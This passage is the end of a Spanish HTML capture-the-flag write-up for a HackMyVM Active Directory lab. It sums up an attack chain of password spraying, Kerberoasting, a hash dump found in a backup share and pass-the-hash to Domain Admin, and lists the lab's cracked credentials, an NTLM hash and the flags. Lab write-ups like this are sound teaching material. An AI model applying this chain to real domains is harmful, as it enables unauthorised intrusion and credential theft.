+      </div>
+    </div>
+  </section>
+
+  <!-- ── Cadena de Ataque ── -->
+  <section class="section" id="s9">
+    <div class="section-header">
+      <div class="section-number">9</div>
+      <h2>Cadena de Ataque — Resumen Visual</h2>
+    </div>
+    <div class="card">
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-dot blue"></div>
+          <div class="tl-time">Fase 1 — Reconocimiento</div>
+          <div class="tl-title">nmap -p- → 15 puertos, Windows Server 2022, SOUPEDECODE.LOCAL</div>
+          <div class="tl-desc">Identificación del DC por presencia simultánea de puertos Kerberos (88), LDAP (389), DNS (53), SMB (445) y WinRM (5985). OS fingerprinting confirma Windows Server 2022 Build 20348.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot blue"></div>
+          <div class="tl-time">Fase 2 — Enumeración de Usuarios</div>
+          <div class="tl-title">RID Brute-Force → 1 069 cuentas de dominio enumeradas</div>
+          <div class="tl-desc">netexec con sesión guest itera RIDs 500-10000. Se extraen 1 069 usuarios incluyendo cuentas de servicio (file_svc, backup_svc, etc.) y 958 usuarios humanos para password spray.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot orange"></div>
+          <div class="tl-time">Fase 3 — Acceso Inicial</div>
+          <div class="tl-title">Password Spray → ybob317:ybob317 (user = contraseña)</div>
+          <div class="tl-desc">De 958 usuarios probados, ybob317 utiliza su nombre como contraseña. Acceso autenticado al dominio. Se accede a shares estándar (NETLOGON, SYSVOL) sin privilegios elevados.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot red"></div>
+          <div class="tl-time">Fase 4 — Kerberoasting</div>
+          <div class="tl-title">5 TGS-REP hashes → hashcat → file_svc:Password123!!</div>
+          <div class="tl-desc">Con ybob317 se solicitan TGS para 5 SPNs del dominio. Hashcat crackea el hash de file_svc en rockyou.txt. Los 4 hashes restantes resisten con contraseñas más complejas.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot yellow"></div>
+          <div class="tl-time">Fase 5 — Movimiento Lateral</div>
+          <div class="tl-title">Share backup → backup_extract.txt → FileServer$:e41da7e79a4c76dbd9cf79d1cb325559</div>
+          <div class="tl-desc">file_svc tiene acceso al share "backup" que expone un volcado de hashes NTLM del AD. Se identifica que FileServer$ (cuenta de máquina) pertenece a Domain Admins.</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-dot green"></div>
+          <div class="tl-time">Fase 6 — Domain Compromise</div>
+          <div class="tl-title">PTH → evil-winrm → NT AUTHORITY\SYSTEM · Domain Admin · root.txt</div>
+          <div class="tl-desc">Pass-The-Hash con el NTLM de FileServer$ otorga shell WinRM como Domain Admin. Root flag leída de C:\Users\Administrator\Desktop\root.txt. Dominio SOUPEDECODE.LOCAL completamente comprometido.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Cadena de Credenciales</h3>
+      <div class="cred-chain">
+        <div class="cred-item">
+          <div class="cred-icon">&#128100;</div>
+          <div class="cred-info">
+            <div class="cred-user">ybob317</div>
+            <div class="cred-pass">password: ybob317</div>
+            <div class="cred-method">Password Spray — user = pass</div>
+          </div>
+          <span class="badge badge-orange">Acceso Inicial</span>
+        </div>
+        <div class="cred-arrow">&#8595;</div>
+        <div class="cred-item">
+          <div class="cred-icon">&#128272;</div>
+          <div class="cred-info">
+            <div class="cred-user">file_svc</div>
+            <div class="cred-pass">password: Password123!!</div>
+            <div class="cred-method">Kerberoasting + Hashcat (rockyou.txt)</div>
+          </div>
+          <span class="badge badge-yellow">Cred Access</span>
+        </div>
+        <div class="cred-arrow">&#8595;</div>
+        <div class="cred-item">
+          <div class="cred-icon">&#128187;</div>
+          <div class="cred-info">
+            <div class="cred-user">FileServer$</div>
+            <div class="cred-pass">NTLM: e41da7e79a4c76dbd9cf79d1cb325559</div>
+            <div class="cred-method">backup share → backup_extract.txt → Domain Admin</div>
+          </div>
+          <span class="badge badge-red">Domain Admin</span>
+        </div>
+        <div class="cred-arrow">&#8595;</div>
+        <div class="cred-item" style="border-color:rgba(248,113,113,0.4)">
+          <div class="cred-icon">&#128081;</div>
+          <div class="cred-info">
+            <div class="cred-user" style="color:var(--red)">NT AUTHORITY\SYSTEM</div>
+            <div class="cred-pass" style="color:var(--text-dim)">evil-winrm PTH → SOUPEDECODE.LOCAL → Domain Compromised</div>
+            <div class="cred-method">Pass-The-Hash via WinRM (port 5985)</div>
+          </div>
+          <span class="badge badge-red">PWNED ✓</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ═══ SIDEBAR ═══ -->
+<aside class="sidebar">
+
+  <!-- Navegación -->
+  <div class="sidebar-card">
+    <h3>Navegación</h3>
+    <a href="#s1" class="nav-link"><span class="nav-num">1</span> Descripción</a>
+    <a href="#s2" class="nav-link"><span class="nav-num">2</span> Reconocimiento</a>
+    <a href="#s3" class="nav-link"><span class="nav-num">3</span> Password Spray</a>
+    <a href="#s4" class="nav-link"><span class="nav-num">4</span> Kerberoasting</a>
+    <a href="#s5" class="nav-link"><span class="nav-num">5</span> Backup Share</a>
+    <a href="#s6" class="nav-link"><span class="nav-num">6</span> Pass-The-Hash</a>
+    <a href="#s7" class="nav-link"><span class="nav-num">7</span> MITRE ATT&amp;CK</a>
+    <a href="#s8" class="nav-link"><span class="nav-num">8</span> Hardening</a>
+    <a href="#s9" class="nav-link"><span class="nav-num">9</span> Cadena de Ataque</a>
+  </div>
+
+  <!-- Info del objetivo -->
+  <div class="sidebar-card">
+    <h3>Datos del Objetivo</h3>
+    <div style="display:flex;flex-direction:column;gap:10px">
+      <div>
+        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:3px">IP / Host</div>
+        <div style="font-family:monospace;font-size:13px;color:var(--orange);font-weight:700">10.0.2.9</div>
+      </div>
+      <div>
+        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:3px">Dominio</div>
+        <div style="font-family:monospace;font-size:12px;color:var(--cyan)">SOUPEDECODE.LOCAL</div>
+      </div>
+      <div>
+        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:3px">Sistema Operativo</div>
+        <div style="font-size:13px;color:var(--text)">Windows Server 2022<br><span style="color:var(--text-muted);font-size:11px">Build 20348 (DC01)</span></div>
+      </div>
+      <div>
+        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:3px">Plataforma</div>
+        <div style="font-size:13px;color:var(--text)">HackMyVM · Easy</div>
+      </div>
+      <div>
+        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:3px">Fecha</div>
+        <div style="font-size:13px;color:var(--text)">13/03/2026</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Credenciales -->
+  <div class="sidebar-card">
+    <h3>Credenciales Obtenidas</h3>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div style="background:var(--bg3);border-radius:6px;padding:10px;border:1px solid var(--border)">
+        <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px">Password Spray</div>
+        <div style="font-family:monospace;font-size:12px;color:var(--purple)">ybob317</div>
+        <div style="font-family:monospace;font-size:11px;color:var(--cyan)">:ybob317</div>
+      </div>
+      <div style="background:var(--bg3);border-radius:6px;padding:10px;border:1px solid var(--border)">
+        <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px">Kerberoasting</div>
+        <div style="font-family:monospace;font-size:12px;color:var(--purple)">file_svc</div>
+        <div style="font-family:monospace;font-size:11px;color:var(--cyan)">:Password123!!</div>
+      </div>
+      <div style="background:var(--bg3);border-radius:6px;padding:10px;border:1px solid rgba(248,113,113,0.3)">
+        <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px">Domain Admin (PTH)</div>
+        <div style="font-family:monospace;font-size:12px;color:var(--red)">FileServer$</div>
+        <div style="font-family:monospace;font-size:10px;color:var(--yellow);word-break:break-all">e41da7e79a4c76dbd9cf79d1cb325559</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Flags -->
+  <div class="sidebar-card">
+    <h3>Flags</h3>
+    <div style="display:flex;flex-direction:column;gap:10px">
+      <div style="background:var(--bg3);border-radius:6px;padding:12px;border:1px solid var(--border)">
+        <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px">&#127988; USER FLAG</div>
+        <div style="font-family:monospace;font-size:11px;color:var(--accent);word-break:break-all">6bab1f09a7403980bfeb4c2b412be47b</div>
+      </div>
+      <div style="background:var(--bg3);border-radius:6px;padding:12px;border:1px solid rgba(248,113,113,0.3)">
+        <div style="font-size:10px;color:var(--text-muted);margin-bottom:4px">&#128081; ROOT FLAG</div>
+        <div style="font-family:monospace;font-size:11px;color:var(--red);word-break:break-all">a9564ebc3289b7a14551baf8ad5ec60a</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Severidad -->
+  <div class="sidebar-card">
+    <h3>Severidad por Hallazgo</h3>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">Contraseñas débiles</span>
+        <span class="badge badge-red">Crítico</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">Kerberoasting (RC4)</span>
+        <span class="badge badge-red">Crítico</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">Hashes en share backup</span>
+        <span class="badge badge-red">Crítico</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">Machine account DA</span>
+        <span class="badge badge-red">Crítico</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">RID Brute-Force</span>
+        <span class="badge badge-orange">Alto</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;align-items:center;font-size:0.85rem">
+        <span style="color:var(--text-dim)">WinRM expuesto</span>
+        <span class="badge badge-yellow">Medio</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Herramientas -->
+  <div class="sidebar-card">
+    <h3>Herramientas Usadas</h3>
+    <div style="display:flex;flex-wrap:wrap;gap:6px">
+      <span class="badge badge-blue">nmap</span>
+      <span class="badge badge-blue">netexec</span>
+      <span class="badge badge-blue">smbclient</span>
+      <span class="badge badge-purple">GetUserSPNs.py</span>
+      <span class="badge badge-purple">impacket</span>
+      <span class="badge badge-orange">hashcat</span>
+      <span class="badge badge-red">evil-winrm</span>
+      <span class="badge badge-yellow">rockyou.txt</span>
+    </div>
+  </div>
+
+</aside>
+
+</div><!-- /grid -->
+</div><!-- /container -->
+
+<footer>
+  <p>Pentest realizado el 13/03/2026 &middot; HackMyVM &middot; DC01 &middot; Easy &middot; SOUPEDECODE.LOCAL</p>
+  <p style="margin-top:6px">Informe generado con fines educativos. Entorno controlado de laboratorio.</p>
+</footer>
+
+</body>
+</html>
